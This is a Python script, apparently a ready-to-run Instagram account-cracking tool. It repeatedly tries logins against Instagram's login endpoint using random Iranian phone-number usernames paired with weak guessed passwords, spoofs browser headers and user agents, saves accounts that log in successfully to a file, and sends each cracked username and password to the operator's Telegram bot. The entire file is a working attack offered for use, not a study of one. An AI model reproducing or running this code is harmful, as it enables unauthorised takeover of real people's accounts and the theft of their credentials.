# coder : exec - warrior
# github : 6f8
# instagram : gxp6
# telegram : ysysd
# Dont Give Up




W ="\033[0m";R ='\033[31;1m';B ="\033[1;90m"; C ="\033[1;97m";E ="\033[1;92m"
try:import requests,random,os;from user_agent import *;from user_agent import generate_user_agent;from time import sleep
except:os.system('pip install requests')

lib = input("""
\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mIraN \033[31;1m20 | \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mIraN \033[31;1m21
\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mIraN \033[31;1m22 | \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mIraN \033[31;1m23
\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mIraN \033[31;1m24 | \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mIraN \033[31;1m25

\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mPlease Choice any Number : """+E)

ID = input('\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97m Enter Your ID Tele : '+E)
token = input('\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97m Enter Your Token Bot : '+E)


def E1():
    global time_sleep
    ban, av, er, at = 0,0,0,0
    while True:
        sleep(time_sleep)
        N = "09876543221"
        R = ''.join(random.choice(N)for t in range(7))
        username = '98921'+R
        password = ''+R
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {'accept':'*/*','accept-language':'en-US,en;q=0.9','content-length':'378','content-type':'application/x-www-form-urlencoded','cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVreferer':'https://www.instagram.com/','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','x-asbd-id':'198387','user-agent': generate_user_agent(),'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'3bcc4d0b0733','x-requested-with':'XMLHttpRequest',}
        data = {'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(password),'username':username,}
        req = requests.post(url,headers=headers,data=data).text
        if "userId" in req:            
            at += 1
            av += 1
            open("Good.txt","a").write(f"{username}:{password}\n")
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • ?????????? - ???????? ???????? ??\n- ???? ? {username} ?\n- ???? ? : {password}\n?????????????\n• ???????? : @YSYSD -K- @VNVN6')
        elif '"message":"challenge_required","challenge"' in req:
            at += 1
            ban += 1
            open("Banned.txt","a").write(f"{username}:{password}")
        else:
            er += 1
            print(f'\r\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mFound {av} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mTaken {er} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97m{username} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97m{password} !',end="")

def E2():
    global time_sleep
    ban, av, er, at = 0,0,0,0
    while True:
        sleep(time_sleep)
        N = "09876543221"
        R = ''.join(random.choice(N)for t in range(7))
        username = '98920'+R
        password = ''+R
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {'accept':'*/*','accept-language':'en-US,en;q=0.9','content-length':'378','content-type':'application/x-www-form-urlencoded','cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVreferer':'https://www.instagram.com/','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','x-asbd-id':'198387','user-agent': generate_user_agent(),'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'3bcc4d0b0733','x-requested-with':'XMLHttpRequest',}
        data = {'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(password),'username':username,}
        req = requests.post(url,headers=headers,data=data).text
        if "userId" in req:            
            at += 1
            av += 1
            open("Good.txt","a").write(f"{username}:{password}\n")
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • ?????????? - ???????? ???????? ??\n- ???? ? {username} ?\n- ???? ? : {password}\n?????????????\n• ???????? : @YSYSD -K- @VNVN6')
        elif '"message":"challenge_required","challenge"' in req:
            at += 1
            ban += 1
            open("Banned.txt","a").write(f"{username}:{password}")
        else:
            er += 1
            print(f'\r\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mFound {av} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mTaken {er} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97m{username} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97m{password} !',end="")

def E3():
    global time_sleep
    ban, av, er, at = 0,0,0,0
    while True:
        sleep(time_sleep)
        N = "09876543221"
        R = ''.join(random.choice(N)for t in range(7))
        username = '98922'+R
        password = ''+R
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {'accept':'*/*','accept-language':'en-US,en;q=0.9','content-length':'378','content-type':'application/x-www-form-urlencoded','cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVreferer':'https://www.instagram.com/','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','x-asbd-id':'198387','user-agent': generate_user_agent(),'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'3bcc4d0b0733','x-requested-with':'XMLHttpRequest',}
        data = {'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(password),'username':username,}
        req = requests.post(url,headers=headers,data=data).text
        if "userId" in req:            
            at += 1
            av += 1
            open("Good.txt","a").write(f"{username}:{password}\n")
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • ?????????? - ???????? ???????? ??\n- ???? ? {username} ?\n- ???? ? : {password}\n?????????????\n• ???????? : @YSYSD -K- @VNVN6')
        elif '"message":"challenge_required","challenge"' in req:
            at += 1
            ban += 1
            open("Banned.txt","a").write(f"{username}:{password}")
        else:
            er += 1
            
            print(f'\r\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mFound {av} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mTaken {er} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97m{username} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97m{password} !',end="")          

def E4():
    global time_sleep
    ban, av, er, at = 0,0,0,0
    while True:
        sleep(time_sleep)
        N = "09876543221"
        R = ''.join(random.choice(N)for t in range(7))
        username = '98923'+R
        password = ''+R
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {'accept':'*/*','accept-language':'en-US,en;q=0.9','content-length':'378','content-type':'application/x-www-form-urlencoded','cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVreferer':'https://www.instagram.com/','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','x-asbd-id':'198387','user-agent': generate_user_agent(),'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'3bcc4d0b0733','x-requested-with':'XMLHttpRequest',}
        data = {'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(password),'username':username,}
        req = requests.post(url,headers=headers,data=data).text
        if "userId" in req:            
            at += 1
            av += 1
            
            open("Good.txt","a").write(f"{username}:{password}\n")
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • ?????????? - ???????? ???????? ??\n- ???? ? {username} ?\n- ???? ? : {password}\n?????????????\n• ???????? : @YSYSD -K- @VNVN6')
        elif '"message":"challenge_required","challenge"' in req:
            at += 1
            ban += 1
            open("Banned.txt","a").write(f"{username}:{password}")
        else:
            er += 1
            
            print(f'\r\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mFound {av} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mTaken {er} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97m{username} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97m{password} !',end="")

def E5():
    global time_sleep
    ban, av, er, at = 0,0,0,0
    while True:
        sleep(time_sleep)
        N = "09876543221"
        R = ''.join(random.choice(N)for t in range(7))
        username = '98924'+R
        password = ''+R
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {'accept':'*/*','accept-language':'en-US,en;q=0.9','content-length':'378','content-type':'application/x-www-form-urlencoded','cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVreferer':'https://www.instagram.com/','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','x-asbd-id':'198387','user-agent': generate_user_agent(),'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'3bcc4d0b0733','x-requested-with':'XMLHttpRequest',}
        data = {'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(password),'username':username,}
        req = requests.post(url,headers=headers,data=data).text
        if "userId" in req:            
            at += 1
            av += 1
            
            open("Good.txt","a").write(f"{username}:{password}\n")
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • ?????????? - ???????? ???????? ??\n- ???? ? {username} ?\n- ???? ? : {password}\n?????????????\n• ???????? : @YSYSD -K- @VNVN6')
        elif '"message":"challenge_required","challenge"' in req:
            at += 1
            ban += 1
            open("Banned.txt","a").write(f"{username}:{password}")
        else:
            er += 1
            
            print(f'\r\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mFound {av} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mTaken {er} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97m{username} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97m{password} !',end="")

def E6():
    global time_sleep
    ban, av, er, at = 0,0,0,0
    while True:
        sleep(time_sleep)
        N = "09876543221"
        R = ''.join(random.choice(N)for t in range(7))
        username = '98925'+R
        password = ''+R
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {'accept':'*/*','accept-language':'en-US,en;q=0.9','content-length':'378','content-type':'application/x-www-form-urlencoded','cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVreferer':'https://www.instagram.com/','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','x-asbd-id':'198387','user-agent': generate_user_agent(),'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'3bcc4d0b0733','x-requested-with':'XMLHttpRequest',}
        data = {'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(password),'username':username,}
        req = requests.post(url,headers=headers,data=data).text
        if "userId" in req:            
            at += 1
            av += 1
            
            open("Good.txt","a").write(f"{username}:{password}\n")
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • ?????????? - ???????? ???????? ??\n- ???? ? {username} ?\n- ???? ? : {password}\n?????????????\n• ???????? : @YSYSD -K- @VNVN6')
        elif '"message":"challenge_required","challenge"' in req:
            at += 1
            ban += 1
            open("Banned.txt","a").write(f"{username}:{password}")
        else:
            er += 1
            print(f'\r\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mFound {av} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mTaken {er} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97m{username} : \033[31;1m[\033[1;92m+\033[31;1m] \033[1;97m{password} !',end="")

if lib == "20":
    time_sleep = int(input('\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mIraN \033[31;1mEnter Your Sleep: '))
    E1()
if lib == "21":
    time_sleep = int(input('\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mIraN \033[31;1mEnter Your Sleep: '))
    E2()
if lib == "22":
    time_sleep = int(input('\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mIraN \033[31;1mEnter Your Sleep: '))
    E3()
if lib == "23":
    time_sleep = int(input('\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mIraN \033[31;1mEnter Your Sleep: '))
    E4()
if lib == "24":
    time_sleep = int(input('\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mIraN \033[31;1mEnter Your Sleep: '))
    E5()
if lib == "25":
    time_sleep = int(input('\033[31;1m[\033[1;92m+\033[31;1m] \033[1;97mIraN \033[31;1mEnter Your Sleep: '))
    E6()


